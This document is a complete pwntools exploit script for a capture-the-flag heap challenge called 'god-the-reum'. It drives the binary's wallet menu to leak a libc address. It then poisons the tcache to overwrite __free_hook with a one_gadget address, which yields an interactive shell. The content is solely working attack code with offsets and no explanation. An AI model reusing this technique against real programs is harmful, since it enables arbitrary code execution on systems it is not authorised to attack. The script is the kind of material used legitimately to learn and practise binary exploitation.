from pwn import *


def sla(x, y): return p.sendlineafter(x, y)


def ru(x): return p.recvuntil(x)


def create(size):
    sla('choice : ', str(1))
    sla('eth? : ', str(size))


def deposit(idx, amount):
    sla('choice : ', str(2))
    sla('no : ', str(idx))
    sla('deposit? : ', str(amount))


def withdraw(idx, amount):
    sla('choice : ', str(3))
    sla('no : ', str(idx))
    sla('withdraw? : ', str(amount))


def show():
    sla('choice : ', str(4))


def developer(idx, data):
    sla('choice : ', str(6))
    sla('no : ', str(idx))
    sla('new eth : ', data)


p = process('./god-the-reum', env={'LD_PRELOAD': './libc-2.27.so'})
bin = ELF('./god-the-reum')
libc = ELF('./libc-2.27.so')

free_hook_offset = 0x3ed8e8
one_gadget_offset = 0x4f322  # 0x4f2c5 0x4f322 0x10a38c

# gdb.attach(p, '')

# libc leak
create(0x1000)  # 1
create(0x10)    # 2
withdraw(0, 0x1000)
show()
ru('ballance ')
libc_addr = int(ru('\n')[:-1]) - 0x3ebca0
log.info('Libc Addr: ' + hex(libc_addr))

# tcache
withdraw(1, 0x10)
developer(1, p64(libc_addr + free_hook_offset))
create(0x10)    # 3
create(0x10)    # 4
developer(3, p64(libc_addr + one_gadget_offset))
withdraw(2, 0x10)

p.interactive()
